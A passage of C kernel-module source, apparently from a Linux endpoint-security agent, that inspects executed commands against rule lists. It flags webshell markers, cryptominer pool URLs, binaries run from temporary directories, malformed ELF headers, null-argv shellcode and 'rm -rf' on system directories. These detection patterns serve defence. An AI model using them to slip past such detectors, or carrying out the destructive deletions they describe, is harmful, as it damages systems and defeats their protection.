/*
 * get execve arguments
 */

#include "interface.h"

#include <linux/file.h>
#include <linux/fs_struct.h>
#include <linux/pipe_fs_i.h>

#if LINUX_VERSION_CODE > KERNEL_VERSION(2,6,25)
#include <linux/fdtable.h>  //低版本无此文件，都包含在file.h里
#endif

#include <linux/binfmts.h>
#include <linux/highmem.h>
#include <linux/mm.h>
#include <linux/slab.h> //for kmalloc/kfree

#include <linux/security.h>

#if !defined(CONFIG_MMU) || LINUX_VERSION_CODE < KERNEL_VERSION(2,6,23)
static unsigned long old_p_max = PAGE_SIZE * MAX_ARG_PAGES - sizeof(void *);
#endif

/* "*"和""，不是需要比较的条件 */
int is_valid_str(char *str)
{
	if (!str) {
		return 0;
	}
	if (str[0] == 0 || strcmp(str, "*") == 0) {
		return 0;
	}
	return 1;
}

/*
 * 比较命令名，支持通配符*
 * 返回值：1，匹配
 *         0，不匹配
 */
static int cmdname_match(char *pattern, char *name)
{
	int len1 = 0, len2 = 0;
	char *ptr = NULL;

	if (!pattern || !name) {
		return 0;
	}

	ptr = strchr(pattern, '*');
	if (!ptr) {			//no *
		if (strcmp(pattern, name) == 0) {
			return 1;
		}
		return 0;
	}

	if (ptr == pattern) {		// *yyy
		len1 = strlen(pattern) - 1;
		len2 = strlen(name);
		if (len2 < len1) {	//name比pattern短
			return 0;
		}
		if (strcmp(name+len2-len1, pattern+1) == 0) { //以yyy结尾
			return 1;
		}
		return 0;
	}

	if (*(ptr+1) == 0) {		// xxx*
		len1 = strlen(pattern) - 1;
		if (strncmp(name, pattern, len1) == 0) { //以xxx开头
			return 1;
		}
		return 0;
	}

	/* xxx*yyy */
	len1 = ptr - pattern; //xxx的长度
	if (strncmp(name, pattern, len1) == 0) { //以xxx开头
		ptr++;
		len1 = strlen(ptr); //yyy的长度
		len2 = strlen(name);
		if (strcmp(name+len2-len1, ptr) == 0) { //以yyy结尾
			return 1;
		}
	}

	return 0;
}

//TODO md5相同时，cmdline里的命令名可以忽略
/* return 1, match; 0, not match */
static int cmdline_match(char *pattern, char *cmdline, char match_type)
{
	int type = RULE_FLAG_PARAM_EQUAL;

	if (!pattern || !cmdline) {
		return 0;
	}

	if (match_type & RULE_FLAG_PARAM_INCLUDE) {
		type = RULE_FLAG_PARAM_INCLUDE;
	} else if (match_type & RULE_FLAG_PARAM_EXCLUDE) {
		type = RULE_FLAG_PARAM_EXCLUDE;
	}

	if (type == RULE_FLAG_PARAM_EQUAL) {
		if (strcmp(pattern, cmdline) == 0) {
			return 1; //相等
		}
		return 0;
	}

	if (type == RULE_FLAG_PARAM_INCLUDE) {
		if (strstr(cmdline, pattern)) {
			return 1; //包含
		}
		return 0;
	}

	if (strstr(cmdline, pattern)) {
		return 0;
	}
	return 1; //不包含
}

#define MD5_NOMD5     0
#define MD5_MATCH     1
#define MD5_DISMATCH  2
/*
 * 在程序尾部拼接随机数据，是一种简单的改变程序md5值且不改变程序功能的方法，可能被用来逃避黑名单检测
 * md5_src是规则中的MD5；md5_dst_a是程序整体的MD5；md5_dst_b是程序有效部分的MD5
 * md5_src和md5_dst_a不可以为空，md5_dst_b可以为空，代表程序尾部没有拼接其他数据
 */
static int check_md5_match(char *md5_src, char *md5_dst_a, char *md5_dst_b)
{
	if (!md5_src) {
		return MD5_NOMD5;
	}

	if (!md5_dst_a || md5_dst_a[0] == 0) {
		return MD5_NOMD5;
	}

	/* 程序md5与规则匹配 */
	if (strcmp(md5_src, md5_dst_a) == 0) {
		return MD5_MATCH;
	}

	/* 程序尾部没有拼接其他数据，程序md5与规则不匹配 */
	if (!md5_dst_b || md5_dst_b[0] == 0) {
		return MD5_DISMATCH;
	}

	/* 程序尾部拼接了其他数据，程序有效部分的md5与规则匹配 */
	if (strcmp(md5_src, md5_dst_b) == 0) {
		return MD5_MATCH;
	}

	/* 程序尾部拼接了其他数据，程序md5与规则不匹配 */
	return MD5_DISMATCH;
}

/* 五种事件不匹配命令行参数：对外服务进程异常执行命令、提权、挖矿、MBR防护、非法卸载 */
static int ignore_cmdline_check(int trustlist, int event_flag, int filterlist, taskreq_t *req)
{
	if (trustlist) {
		if (event_flag & EVENT_PrivilegeEscalation) {
			mypdebug3("EVENT_PrivilegeEscalation ignore cmdline check\n");
			return 1;
		}
		if (event_flag & EVENT_Mining) {
			mypdebug3("EVENT_Mining ignore cmdline check\n");
			return 1;
		}
		if (event_flag & EVENT_ServiceProcess) {
			mypdebug3("EVENT_ServiceProcess ignore cmdline check\n");
			return 1;
		}
		if (event_flag & EVENT_MBRAttack) {
			mypdebug3("EVENT_MBRAttack ignore cmdline check\n");
			return 1;
		}
	}

	if (filterlist) {
		if (req->pflags.privup || req->pflags.dirtycow) {
			mypdebug3("EVENT_PrivilegeEscalation ignore cmdline check\n");
			return 1;
		}
		if (req->pflags.minepool) {
			mypdebug3("EVENT_Mining ignore cmdline check\n");
			return 1;
		}
		if (req->pflags.webexec_danger) {
			mypdebug3("EVENT_ServiceProcess ignore cmdline check\n");
			return 1;
		}
		if (req->pflags.writedisk) {
			mypdebug3("EVENT_MBRAttack ignore cmdline check\n");
			return 1;
		}
		if (req->pflags.killsniper) {
			mypdebug3("EVENT %s sniper ignore cmdline check\n", req->pflags.modifysniper ? "modify" : "kill");
			return 1;
		}
	}

	return 0;
}
#define FULL_EVENT 0xffffffff
extern void get_cmd_md5(struct linux_binprm *bprm, char *md5, char *md5_2, struct file *exe_file);
/*
 * 在程序尾部拼接随机数据，是一种简单的改变程序md5值且不改变程序功能的方法，可能被用来逃避黑名单检测
 * 对这样的程序，用md5_2来代表程序有效部分的md5，进行检测
 */
static int check_plist_match(taskreq_t *req, sniper_plist_t *plist, int count, int event_flag,
			     struct linux_binprm *bprm, char *middleware)
{
	int i = 0, blacklist = 0, filterlist = 0, trustlist = 0;
	char *cmd = NULL, *args = NULL, *cmdname = NULL;
	char md5_2[S_MD5LEN+1] = {0};

	cmd = &(req->args);
	args = cmd + req->cmdlen + 1;
	if (cmd[0] != '/' && !sniper_badptr(bprm)) {
		cmd = (char *)bprm->filename;
	}
	cmdname = safebasename(cmd);

	if ((char *)plist == (char *)sniper_pblack) {
		blacklist = 1;
		mypdebug3("check black: %s\n", args);
	} else if ((char *)plist == (char *)sniper_pfilter) {
		filterlist = 1;
		mypdebug3("check filter: %s\n", args);
	} else {
		trustlist = 1;
		mypdebug3("check trust: %s\n", args);
	}

	for (i = 0; i < count; i++, plist++) {
		int checked = 0, md5_match = MD5_NOMD5;

		mypdebug3("%d: event_flag %x, plist->event_flag %x\n", i, event_flag, plist->event_flag);
		if (event_flag != FULL_EVENT && !(plist->event_flag & event_flag)) {
			continue;
		}

		/* 有md5条件，先比较md5，比较了md5不用再比进程名和路径，直接比参数 */
		if (is_valid_str(plist->md5)) {
			checked = 1;

			/*
			 * 为了减小开销，不总是算命令程序的md5，仅当规则名单中有md5字段时才需要算。
			 * 命令程序的md5算过一次后，不需要重复计算，通过req->md5传递复用。
			 *
			 * 规则名单的检测顺序总是先检查黑名单，再检查过滤名单，最后检查可信名单
			 * 如果黑名单检查时算了md5和md5_2，不需要把md5_2传给过滤和可信复用即可，他们不关心md5_2
			 */
			if (req->md5[0] == 0) {
				get_cmd_md5(bprm, req->md5, md5_2, req->exe_file);
			}

			/* 只有黑名单才需要检查2个md5，防止尾部添加任意字符逃避检测 */
			if (blacklist) {
				md5_match = check_md5_match(plist->md5, req->md5, md5_2);
				mypdebug3("plist->md5 %s, req->md5 %s, md5_2 %s.\n", plist->md5, req->md5, md5_2);
			} else {
				md5_match = check_md5_match(plist->md5, req->md5, NULL);
				mypdebug3("plist->md5 %s, req->md5 %s.\n", plist->md5, req->md5);
			}

			if (md5_match == MD5_DISMATCH) {
				continue;
			}
		}

		/* 黑名单md5匹配了，不需要再匹配进程名和路径。其他名单需要 */
		/* 如果没有md5条件，检查进程名和路径 */
		if (md5_match == MD5_NOMD5 || !blacklist) {
			if (is_valid_str(plist->cmdname)) {
				checked = 1;
				mypdebug3("plist->cmdname %s, cmdname %s\n", plist->cmdname, cmdname);
				if (!cmdname_match(plist->cmdname, cmdname)) {
					continue;
				}
			}

			if (is_valid_str(plist->cmdpath)) {
				checked = 1;
				mypdebug3("plist->cmdpath %s, cmd %s\n", plist->cmdpath, cmd);
				if (strcmp(plist->cmdpath, cmd) != 0) {
					continue;
				}
			}
		}

		if (is_valid_str(plist->cmdline)) {
			/* 四种事件不匹配命令行参数：对外服务进程异常执行命令、提权、挖矿、MBR防护 */
			if (!ignore_cmdline_check(trustlist, event_flag, filterlist, req)) {
				checked = 1;
				mypdebug3("plist->cmdline %s, args %s, flag %d\n", plist->cmdline, args, plist->flag);
				if (!cmdline_match(plist->cmdline, args, plist->flag)) {
					continue;
				}
			}
		}

		if (plist->flag & RULE_FLAG_UID) {
			checked = 1;
			mypdebug3("plist->uid %u, uid %u\n", plist->uid, req->uid);
			if (plist->uid != req->uid) {
				continue;
			}
		}

		if (is_valid_str(plist->pcmdname)) {
			checked = 1;
			/* 对外服务进程事件，检查规则中的父进程是否为对外服务进程 */
			if (event_flag == EVENT_ServiceProcess) {
				mypdebug3("plist->pcmdname %s, parent %s\n", plist->pcmdname, middleware);
				//TODO middleware最长15个字符，plist->pcmdname可能超过，处理这个差异
				if (!cmdname_match(plist->pcmdname, middleware)) {
					continue;
				}
			} else {
				mypdebug3("plist->pcmdname %s, parent %s\n", plist->pcmdname, req->pinfo.task[0].comm);
				if (!cmdname_match(plist->pcmdname, req->pinfo.task[0].comm)) {
//ZX20220531 get_task_cmdname()改为取task->comm，故此处不需要针对bash/dash做额外判断
#if 0
					//ZX20220104 get_task_cmdname()取的pinfo.task[0].comm是执行的命令，而不是current->comm
					//因此，规则父进程是sh时，真实父进程是bash和dash皆认为命中
					//TODO 完善的话，get_task_cmdname里comm和cmdname都取，这里都比
					int tmp = 0;
					if (strcmp(plist->pcmdname, "sh") == 0 &&
					    (strcmp(req->pinfo.task[0].comm, "bash") == 0 ||
					     strcmp(req->pinfo.task[0].comm, "dash") == 0)) {
						tmp = 1;
					}
					if (!tmp) { 
						continue;
					}
#else
					continue;
#endif
				}
			}
		}

		if (is_valid_str(plist->rip)) {
			checked = 1;
			//if (check_ip_match(plist->rip)) {
			mypdebug3("plist->rip %s, ip %s\n", plist->rip, req->ip);
			if (strcmp(req->ip, plist->rip) != 0) {
				continue;
			}
		}

		/* 这是一条全空的规则，忽略 */
		if (!checked) {
			continue;
		}
		mypdebug3("match\n");
		return 1;
	}

	mypdebug3("not match\n");
	return 0;
}

static int is_black_cmd(taskreq_t *req, struct linux_binprm *bprm)
{
	int ret = 0, count = 0;
	sniper_plist_t *plist = NULL;

	/* 学习和运维模式下规则名单不生效 */
	if (client_mode != NORMAL_MODE) {
		return 0;
	}

	read_lock(&sniper_pblack_lock);

	if (sniper_pblack_count == 0 || !sniper_pblack) {
		read_unlock(&sniper_pblack_lock);
		return 0;
	}

	plist = (sniper_plist_t *)sniper_pblack;
	count = sniper_pblack_count;
	ret = check_plist_match(req, plist, count, FULL_EVENT, bprm, NULL);

	read_unlock(&sniper_pblack_lock);
	return ret;
}

/* 过滤名单匹配，记录的项目全匹配上，才算命中 */
int is_filter_cmd(taskreq_t *req, struct linux_binprm *bprm)
{
	int ret = 0, count = 0;
	sniper_plist_t *plist = NULL;

	/* 学习和运维模式下规则名单不生效 */
	if (client_mode != NORMAL_MODE) {
		return 0;
	}

	read_lock(&sniper_pfilter_lock);

	if (sniper_pfilter_count == 0 || !sniper_pfilter) {
		read_unlock(&sniper_pfilter_lock);
		return 0;
	}

	plist = (sniper_plist_t *)sniper_pfilter;
	count = sniper_pfilter_count;
	ret = check_plist_match(req, plist, count, FULL_EVENT, bprm, NULL);

	read_unlock(&sniper_pfilter_lock);
	if (ret) {
		mypdebug4("%s(%d) run filter command %s\n", current->comm, current->pid, &req->args);
	}
	return ret;
}

/* 信任名单匹配，记录的项目全匹配上，才算命中 */
int is_trust_cmd(taskreq_t *req, int event_flag, struct linux_binprm *bprm, char *middleware)
{
	int ret = 0, count = 0;
	sniper_plist_t *plist = NULL;

	/* 学习和运维模式下规则名单不生效 */
	if (client_mode != NORMAL_MODE) {
		return 0;
	}

	read_lock(&sniper_ptrust_lock);

	if (sniper_ptrust_count == 0 || !sniper_ptrust) {
		read_unlock(&sniper_ptrust_lock);
		return 0;
	}

	plist = (sniper_plist_t *)sniper_ptrust;
	count = sniper_ptrust_count;
	ret = check_plist_match(req, plist, count, event_flag, bprm, middleware);
	if (ret) {
		req->trust_events |= event_flag;
	}

	read_unlock(&sniper_ptrust_lock);
	return ret;
}

#define PEVENT_MASK ~(PSR_WEBSHELL|PSR_WEBEXECUTE_NORMAL|PSR_WEBEXECUTE_DANGER|PSR_MINER|PSR_DANGER|PSR_PORT_FORWARD)
static void check_webshell(taskreq_t *req, struct linux_binprm *bprm)
{
	char *cmd = NULL, *args = NULL;
	conninfo_t info = {0};

	if (!sniper_prule.webshell_on || !req) {
		return;
	}

	cmd = &(req->args);
	args = cmd + req->cmdlen + 1;

	if (strstr(args, "echo [S]") && strstr(args, "echo [E]")) {
		req->flags |= PSR_WEBSHELL;
		req->pflags.webshell = 1;
		if (get_current_peer(&info)) {
			req->flags |= PSR_NETWORK;
			req->pflags.network = 1;
			my_addr2ip(&info.daddr, req->ip, info.family);
		}

		if (is_trust_cmd(req, EVENT_Chopper, bprm, NULL)) {
			return;
		}

		if (sniper_prule.webshell_kill && client_mode == NORMAL_MODE) {
			myprintk("prevent %s(%d) run webshell %s\n",
				current->comm, current->pid, args);
			req->flags |= PSR_STOPED;
			req->pflags.terminate = 1;
		}
	}
}

/* 命令行参数是否包含了列表中的命令 */
static int match_command_table(char *cmdname)
{
	int i = 0;
	sniper_cmdtbl_t *pcommand = NULL;

	read_lock(&sniper_pcommand_lock);

	pcommand = (sniper_cmdtbl_t *)sniper_pcommand;
	if (sniper_badptr(cmdname) || sniper_badptr(pcommand)) {
		read_unlock(&sniper_pcommand_lock);
		return 0;
	}

	for (i = 0; i < sniper_pcommand_count; i++) {
		mypdebug2(PDEBUG_CMD_MATCH, "%d: %s, %s\n", i, cmdname, pcommand->command);
		if (strcmp(cmdname, pcommand->command) == 0) {
			read_unlock(&sniper_pcommand_lock);
			mypdebug2(PDEBUG_CMD_MATCH, "%s match\n", cmdname);
			return 1;
		}
		pcommand++;
	}
	read_unlock(&sniper_pcommand_lock);
	return 0;

}

static void check_webexecute(taskreq_t *req, struct linux_binprm *bprm)
{
	int i = 0, j = 0, k = 0, found = 0;
	struct sniper_middleware *mid = NULL;
	char *cmd = NULL, *args = NULL, *cmdname = NULL;

	if (!sniper_prule.danger_webexecute_on || !req) {
		return;
	}
	if (current->pid < RESERVED_PIDS) {
		return;
	}

	read_lock(&sniper_pmiddleware_lock);
	if (sniper_pmiddleware_count == 0 || !sniper_pmiddleware) {
		read_unlock(&sniper_pmiddleware_lock);
		return;
	}
	read_unlock(&sniper_pmiddleware_lock);

	//TODO 处理sh -c pwd
	cmd = &(req->args);
	mypdebug2(PDEBUG_WEBEXEC, "check_webexecute: %s\n", cmd);

	cmdname = safebasename(cmd);
	if (!match_command_table(cmdname)) {
		return;
	}

	mypdebug2(PDEBUG_WEBEXEC, "check_webexecute: %s in command table\n", cmd);

	if (strcmp(current->parent->comm, "sh") == 0 && parent_is_shell_script()) {
		mypdebug2(PDEBUG_WEBEXEC, "%s(%d) parent %s is shell script\n",
			current->comm, current->pid, current->parent->comm);
		return;
	}

	read_lock(&sniper_pmiddleware_lock);

	mid = (struct sniper_middleware *)sniper_pmiddleware;

	for (i = 0; i < SNIPER_PGEN; i++) {
		if (req->pinfo.task[i].pid < RESERVED_PIDS) {
			break;
		}

		/* 对于nginx/apache+php-fpm的组合，中间件php-fpm执行命令，对应到nginx/apache */
		if (strcmp(req->pinfo.task[i].comm, "php-fpm") == 0) {
			found = 1;
			/* 在中间件列表中找nginx或apache */
			for (j = 0; j < SNIPER_MIDDLEWARE_NUM; j++) {
				/* 忽略空的无效项 */
				if (mid[j].pid == 0) {
					continue;
				}

				if (strcmp("nginx", mid[j].name) == 0 ||
				    strcmp("httpd", mid[j].name) == 0 || strncmp("apache", mid[j].name, 6) == 0 || //httpd/apache2
				    strcmp("lighttpd", mid[j].name) == 0) {
					break;
				}
			}

			if (j < SNIPER_MIDDLEWARE_NUM) {
				snprintf(req->target_cmd, S_COMMLEN, "%s", mid[j].name);
				req->webmid_pid = mid[j].pid;
				req->webmid_port = mid[j].port;
			} else { //没找到就用php-fpm
				snprintf(req->target_cmd, S_COMMLEN, "php-fpm");
				req->webmid_pid = req->pinfo.task[i].pid;
				req->webmid_port = 0;
			}
			break;
		}

		for (j = 0; j < SNIPER_MIDDLEWARE_NUM; j++) {
			/* 忽略空的无效项 */
			if (mid[j].pid == 0) {
				continue;
			}

			/* 比较程序名可能误判，如程序与中间件同名。这里判pid */
			if (req->pinfo.task[i].pid == mid[j].pid) {
				/* 命中的是sshd，忽略 */
				if (strcmp("sshd", mid[j].name) == 0) {
					read_unlock(&sniper_pmiddleware_lock);
					mypdebug2(PDEBUG_WEBEXEC, "check_webexecute: skip as sshd parent\n");
					return;
				}

				/* 忽略这样的场景：中间件->其他命令或脚本->命令 */
				for (k = 0; k <= i; k++) {
					char *comm = req->pinfo.task[k].comm;
					/* get_task_cmdname()里comm取的是cmdname，所以下面要检查是否dash或bash */
					if (strcmp(comm, "sh") != 0 &&
					    strcmp(comm, "bash") != 0 &&
					    strcmp(comm, "dash") != 0 &&
					    strcmp(comm, mid[j].name) != 0) {
						read_unlock(&sniper_pmiddleware_lock);
						mypdebug2(PDEBUG_WEBEXEC, "check_webexecute: "
							"skip as parent %s is exe or script\n", comm);
						return;
					}
				}

				found = 1;
				snprintf(req->target_cmd, S_COMMLEN, "%s", mid[j].name);
				req->webmid_pid = mid[j].pid;
				req->webmid_port = mid[j].port;
				break;
			}
		}

		if (found) {
			break;
		}
	}

	read_unlock(&sniper_pmiddleware_lock);

	if (!found) {
		mypdebug2(PDEBUG_WEBEXEC, "check_webexecute: skip parent not middleware\n");
		return;
	}

	req->flags |= PSR_WEBEXECUTE_DANGER;
	req->pflags.webexec_danger = 1;

	if (is_trust_cmd(req, EVENT_ServiceProcess, bprm, req->target_cmd)) {
		mypdebug2(PDEBUG_WEBEXEC, "check_webexecute: is trust webexecute\n");
		req->trust_events |= EVENT_ServiceProcess;
		return;
	}
	mypdebug2(PDEBUG_WEBEXEC, "check_webexecute: is webexecute\n");

	if (sniper_prule.danger_webexecute_kill && client_mode == NORMAL_MODE) {
		args = cmd + req->cmdlen + 1;
		myprintk("prevent %s(%d) run danger webexecute %s\n",
			current->comm, current->pid, args);
		req->flags |= PSR_STOPED;
		req->pflags.terminate = 1;
	}
}

static void check_miner(taskreq_t *req, struct linux_binprm *bprm)
{
	char *cmd = NULL, *args = NULL;

	if (!sniper_prule.miner_on || !req) {
		return;
	}

	cmd = &(req->args);
	args = cmd + req->cmdlen + 1;

	if (!strstr(args, "stratum+tcp://")) {
		return;
	}

	req->flags |= PSR_MINER;
	req->pflags.miner = 1;

	if (is_trust_cmd(req, EVENT_Mining, bprm, NULL)) {
		return;
	}

	if (sniper_prule.miner_kill && client_mode == NORMAL_MODE) {
		/* 没有命中信任事件，阻断 */
		myprintk("prevent %s(%d) run miner %s\n",
			current->comm, current->pid, args);
		req->flags |= PSR_STOPED;
		req->pflags.terminate = 1;
	}
}

/* pipe是无名管道，fifo是有名管道 */
static void get_pipeino(taskreq_t *req)
{
	struct files_struct *files = current->files;
	struct file *filp0 = NULL;
	struct file *filp1 = NULL;
	struct inode *inode = NULL;

	req->pipein = 0;
	req->pipeout = 0;

	if (!files) {
		return;
	}

	spin_lock(&files->file_lock);

	filp0 = my_fcheck_files(files, 0);
	if (filp0 && filp0->f_dentry && filp0->f_dentry->d_inode) {
        	inode = filp0->f_dentry->d_inode;
		if (S_ISFIFO(inode->i_mode) && filp0->f_dentry->d_name.name[0] == 0) {
			req->flags |= PSR_PIPEIN;
			req->pipein = inode->i_ino;

			/* TODO 取管道对方的IP */
		}
        }

	filp1 = my_fcheck_files(files, 1);
	if (filp1 && filp1->f_dentry && filp1->f_dentry->d_inode) {
        	inode = filp1->f_dentry->d_inode;
		if (S_ISFIFO(inode->i_mode) && filp1->f_dentry->d_name.name[0] == 0) {
			req->flags |= PSR_PIPEOUT;
			req->pipeout = inode->i_ino;

			/* TODO 取管道对方的IP */
		}
        }

	spin_unlock(&files->file_lock);
}

#include <linux/elf.h>
static int is_bad_elfhdr32(struct linux_binprm *bprm)
{
	int i = 0, bad = 0;
	struct elf32_hdr *elfhdr = NULL;
	int elfshdr_size = sizeof(Elf32_Shdr);

	if (!bprm) {
		return 0;
	}

	elfhdr = (struct elf32_hdr *)(bprm->buf);
	if (strncmp(elfhdr->e_ident, ELFMAG, SELFMAG) != 0) {
		return 0;
	}

	if (elfhdr->e_shentsize != elfshdr_size) {
		printk("Size of section headers %d != sizeof Elf32_Shdr %d\n",
			elfhdr->e_shentsize, elfshdr_size);
		bad = 1;
	} else if (elfhdr->e_phnum < 2) {
		printk("Number of program headers < 2\n");
		bad = 1;
#if 0 //静态编译的程序e_shoff是0
	} else if (elfhdr->e_shoff <= elfhdr->e_phoff + elfhdr->e_phentsize) {
		printk("Start of section headers %u <= "
		       "Start of program headers %u + "
		       "Size of program headers %d\n",
			elfhdr->e_shoff, elfhdr->e_phoff, elfhdr->e_phentsize);
		bad = 1;
	} else if (elfhdr->e_shstrndx == 0) {
		if (elfhdr->e_shnum < 2) {
			printk("Number of section headers < 2\n");
			bad = 1;
		}
	} else if (elfhdr->e_shnum <= elfhdr->e_shstrndx) {
		printk("Number of section headers %d <= "
		       "Section header string table index %d\n",
			elfhdr->e_shnum, elfhdr->e_shstrndx);
		bad = 1;
#endif
	}

	if (!bad) {
		return 0;
	}

	printk("%s ELFhdr(size %lu) BAD!\n", bprm->filename, sizeof(struct elf32_hdr));
	printk("Magic: ");
	for (i = 0; i < EI_NIDENT; i++) {
		printk("%x ", elfhdr->e_ident[i]);
	}
	printk("\n");
	printk("Class %d\n", elfhdr->e_ident[4]);
	printk("Data encode %d\n", elfhdr->e_ident[5]);
	printk("Version %d\n", elfhdr->e_ident[6]);

	printk("Type %d\n", elfhdr->e_type);
	printk("Machine %d\n", elfhdr->e_machine);
	printk("Version %d\n", elfhdr->e_version);
	printk("Entry %#x\n", elfhdr->e_entry);
	printk("Start of program headers %u\n", elfhdr->e_phoff);
	printk("Start of section headers %u\n", elfhdr->e_shoff);
	printk("Flags %#x\n", elfhdr->e_flags);
	printk("Size of this header %d\n", elfhdr->e_ehsize);
	printk("Size of program headers %d\n", elfhdr->e_phentsize);
	printk("Number of program headers %d\n", elfhdr->e_phnum);
	printk("Size of section headers %d\n", elfhdr->e_shentsize);
	printk("Number of section headers %d\n", elfhdr->e_shnum);
	printk("Section header string table index %d\n", elfhdr->e_shstrndx);

	return 1;
}
int is_bad_elfhdr(struct linux_binprm *bprm, int *flags)
{
	int i = 0, bad = 0;
	struct elfhdr *elfhdr = NULL;
	int elfshdr_size = sizeof(Elf64_Shdr);

	if (!bprm) {
		return 0;
	}

	if (bprm->buf[4] == ELFCLASS32) {
		*flags |= PSR_ELF32;
		return is_bad_elfhdr32(bprm);
	}

	if (bprm->buf[4] != ELFCLASS64) {
		return 0;
	}

	elfhdr = (struct elfhdr *)(bprm->buf);
	if (strncmp(elfhdr->e_ident, ELFMAG, SELFMAG) != 0) {
		return 0;
	}

	if (elfhdr->e_shentsize != elfshdr_size) {
		printk("Size of section headers %d != sizeof Elf64_Shdr %d\n",
			elfhdr->e_shentsize, elfshdr_size);
		bad = 1;
	} else if (elfhdr->e_phnum < 2) {
		printk("Number of program headers < 2\n");
		bad = 1;
#if 0 //静态编译的程序e_shoff是0
	} else if (elfhdr->e_shoff <= elfhdr->e_phoff + elfhdr->e_phentsize) {
		printk("Start of section headers %llu <= "
		       "Start of program headers %llu + "
		       "Size of program headers %d\n",
			elfhdr->e_shoff, elfhdr->e_phoff, elfhdr->e_phentsize);
		bad = 1;
	} else if (elfhdr->e_shstrndx == 0) {
		if (elfhdr->e_shnum < 2) {
			printk("Number of section headers < 2\n");
			bad = 1;
		}
	} else if (elfhdr->e_shnum <= elfhdr->e_shstrndx) {
		printk("Number of section headers %d <= "
		       "Section header string table index %d\n",
			elfhdr->e_shnum, elfhdr->e_shstrndx);
		bad = 1;
#endif
	}

	if (!bad) {
		return 0;
	}

	printk("%s ELFhdr(size %lu) BAD!\n", bprm->filename, sizeof(struct elfhdr));
	printk("Magic: ");
	for (i = 0; i < EI_NIDENT; i++) {
		printk("%x ", elfhdr->e_ident[i]);
	}
	printk("\n");
	printk("Class %d\n", elfhdr->e_ident[4]);
	printk("Data encode %d\n", elfhdr->e_ident[5]);
	printk("Version %d\n", elfhdr->e_ident[6]);

	printk("Type %d\n", elfhdr->e_type);
	printk("Machine %d\n", elfhdr->e_machine);
	printk("Version %d\n", elfhdr->e_version);
	printk("Entry %#llx\n", elfhdr->e_entry);
	printk("Start of program headers %llu\n", elfhdr->e_phoff);
	printk("Start of section headers %llu\n", elfhdr->e_shoff);
	printk("Flags %#x\n", elfhdr->e_flags);
	printk("Size of this header %d\n", elfhdr->e_ehsize);
	printk("Size of program headers %d\n", elfhdr->e_phentsize);
	printk("Number of program headers %d\n", elfhdr->e_phnum);
	printk("Size of section headers %d\n", elfhdr->e_shentsize);
	printk("Number of section headers %d\n", elfhdr->e_shnum);
	printk("Section header string table index %d\n", elfhdr->e_shstrndx);

	return 1;
}

static size_t elfhdr_filesize(struct linux_binprm *bprm)
{
	size_t size = 0;

	if (!bprm) {
		return 0;
	}

	if (bprm->buf[4] == ELFCLASS32) {
		struct elf32_hdr *elfhdr = NULL;

		elfhdr = (struct elf32_hdr *)(bprm->buf);
		if (strncmp(elfhdr->e_ident, ELFMAG, SELFMAG) != 0) {
			return 0;
		}

		size = elfhdr->e_shoff + elfhdr->e_shentsize * elfhdr->e_shnum;
		return size;
	}

	if (bprm->buf[4] == ELFCLASS64) {
		struct elfhdr *elfhdr = NULL;

		elfhdr = (struct elfhdr *)(bprm->buf);
		if (strncmp(elfhdr->e_ident, ELFMAG, SELFMAG) != 0) {
			return 0;
		}

		size = elfhdr->e_shoff + elfhdr->e_shentsize * elfhdr->e_shnum;
		return size;
	}

	return 0;
}

#define is_dir(cwd, dir, len) (strncmp(cwd, dir, len) == 0 && (cwd[len] == '/' || cwd[len] == 0))
static int in_unexec_dirs(char *cmd, char *cwd)
{
        if (!cmd || !cwd) {
                return 0;
        }

        /* docker 执行的命令是/proc/self/exe */
        if (cmd[0] == '/') {
                if (strncmp(cmd, "/tmp/", 5) == 0 ||
                    strncmp(cmd, "/var/tmp/", 9) == 0 ||
                    strncmp(cmd, "/dev/shm/", 9) == 0 ||
                    strncmp(cmd, "/var/log/", 9) == 0) {
                        return 1;
                }
        } else {
                if (is_dir(cwd, "/tmp", 4) ||
                    is_dir(cwd, "/var/tmp", 8) ||
                    is_dir(cwd, "/dev/shm", 8) ||
                    is_dir(cwd, "/var/log", 8)) {
                        return 1;
                }
        }

        return 0;
}

static int arg_has_sysdir(char *cmdline, char *dir)
{
	char *ptr = NULL;
	int len = strlen(dir);

	ptr = strstr(cmdline, dir);
	/* 是中间的参数或结尾的参数 */
	if (ptr) {
		/* rm -rf /xxx /yyy */
		if (ptr[len] == ' ' || ptr[len] == 0) {
			return 1;
		}

		/* rm -rf /xxx/ /yyy/ */
		if (ptr[len] == '/') {
			if (ptr[len+1] == ' ' || ptr[len+1] == 0) {
				return 1;
			}
		}
	}

	return 0;
}

//TODO 手工实现一个简单的realpath
/* 不需要考虑在根目录下做rm -rf .，和rm -rf /.的情况，rm不允许这么做
   rm: refusing to remove '.' or '..' directory */
#define SYSDIR_NUM 7
char sysdir[SYSDIR_NUM][10] = { "etc", "usr", "dev", "boot", "home", "root", "home/test" };
static int is_rm_sysdir(char *cmdline, char *cwd)
{
	int i = 0;
	char path[S_NAMELEN] = {0};

	if (!cmdline) {
		return 0;
	}

	if (arg_has_sysdir(cmdline, " /")) {
		return 1;
	}

	for (i = 0; i < SYSDIR_NUM; i++) {
		snprintf(path, S_NAMELEN, " /%s", sysdir[i]);
		if (arg_has_sysdir(cmdline, path)) {
			return 1;
		}
	}

	/* 检查是否在/目录下做rm -rf xxx */
	if (cwd && strcmp(cwd, "/") == 0) {
		for (i = 0; i < SYSDIR_NUM; i++) {
			snprintf(path, S_NAMELEN, " %s", sysdir[i]);
			if (arg_has_sysdir(cmdline, path)) {
				return 1;
			}
		}
	}

	return 0;
}

static void check_danger(taskreq_t *req, struct linux_binprm *bprm)
{
	char *cmd = NULL, *args = NULL, *cwd = NULL, *cmdname = NULL;

	if (!req || !sniper_prule.danger_on) {
		return;
	}

	cmd = &(req->args);
	args = cmd + req->cmdlen + 1;
	cwd = args + req->argslen + 1;
	cmdname = safebasename(cmd);
	/* 通过c库调用execve是不允许argv参数为NULL的，这可能是shellcode代码直接调用execve系统调用 */
	if (req->argslen == 0) {
		req->pflags.danger = 1;
		myprintk("%s(%d) run program %s with null argv, may shellcode\n",
			current->comm, current->pid, cmd);
	} else if (strcmp(cmdname, "rm") == 0 && is_rm_sysdir(args, cwd)) { //意图删除系统目录
		req->pflags.danger = 1;
		myprintk("%s(%d) try delete system directory by %s\n",
			current->comm, current->pid, args);
	}

	if (req->pflags.danger) {
		req->flags |= PSR_DANGER;

		if (is_trust_cmd(req, EVENT_RiskCommand, bprm, NULL)) {
			return;
		}
	
		if (sniper_prule.danger_kill && client_mode == NORMAL_MODE) {
			myprintk("prevent %s(%d) do %s\n",
				current->comm, current->pid, req->argslen ? args : cmd);
